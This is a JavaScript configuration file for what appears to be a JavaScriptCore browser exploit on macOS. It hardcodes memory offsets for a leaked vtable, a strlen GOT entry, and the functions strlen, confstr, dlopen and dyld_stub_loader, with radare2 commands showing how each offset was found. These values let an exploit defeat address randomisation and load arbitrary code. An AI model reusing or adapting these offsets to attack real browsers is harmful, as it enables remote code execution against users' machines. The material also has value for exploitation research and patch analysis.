// We could get rid of this entire file by either searching for memory patterns (of the function code) or
// by writing a mach-o/dyld_shared_cache parser in JavaScript. Offsets are fine for this purpose though...

// Offset of leaked vtable from the base of the JavaScriptCore .bss section
//const JSC_VTAB_OFFSET = 0xe5e8;
const JSC_VTAB_OFFSET = 0xe5f8;

// Offset of dyld_stub_loader from the base of libdyld.dylib
//const DYLD_STUB_LOADER_OFFSET = 0x1278;
const DYLD_STUB_LOADER_OFFSET = 0x12a8;

//r2 -qQ libdyld.dylib -c "aa; afl" | grep dyld_stub
//0x000012a8   15 408          sym.dyld_stub_binder

// Offset of GOT entry for strlen from the base of the JavaScriptCore .bss section
//const STRLEN_GOT_OFFSET = 0xee0;
const STRLEN_GOT_OFFSET = 0xee8;

// Offset of strlen from the base of libsystem_c.dylib
//const STRLEN_OFFSET = 0x1420;
const STRLEN_OFFSET = 0x1440;

//r2 -qQ libsystem_c.dylib -c "aa; afl" | grep strlen
//0x00001440    4 86   -> 74   sym._strlen

// Offset of confstr from the base of libsystem_c.dylib
//const CONFSTR_OFFSET = 0x24dc;
const CONFSTR_OFFSET = 0x24fc;

//r2 -qQ libsystem_c.dylib -c "aa; afl" | grep confstr
//0x000024fc   39 682          sym._confstr

// Offset of dlopen from the base of libdyld.dylib
//const DLOPEN_OFFSET = 0x2e30;
const DLOPEN_OFFSET = 0x2e60;

//r2 -qQ libdyld.dylib -c "aa; afl" | grep dlopen
//0x00002e60    5 91           sym._dlopen
